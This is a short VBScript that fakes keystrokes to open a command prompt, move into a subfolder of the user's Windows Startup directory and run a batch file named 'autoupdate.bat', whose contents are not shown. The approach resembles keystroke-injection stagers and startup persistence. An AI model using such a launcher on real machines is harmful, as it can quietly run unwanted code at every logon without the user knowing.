Set wshShell =wscript.CreateObject("WScript.Shell")

wshshell.sendkeys ("^({ESC}E)")
wscript.sleep 100

wshshell.sendkeys ("CMD")
wscript.sleep 100

wshshell.sendkeys ("{ENTER}")
wscript.sleep 1000

wshshell.sendkeys ("{@}echo off")
wshshell.sendkeys ("{ENTER}")

wshshell.sendkeys ("cd {%}userprofile{%}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test")
wshshell.sendkeys ("{ENTER}")

wshshell.sendkeys ("autoupdate.bat")

wshshell.sendkeys ("{ENTER}")

wshshell.sendkeys ("exit")
wshshell.sendkeys ("{ENTER}")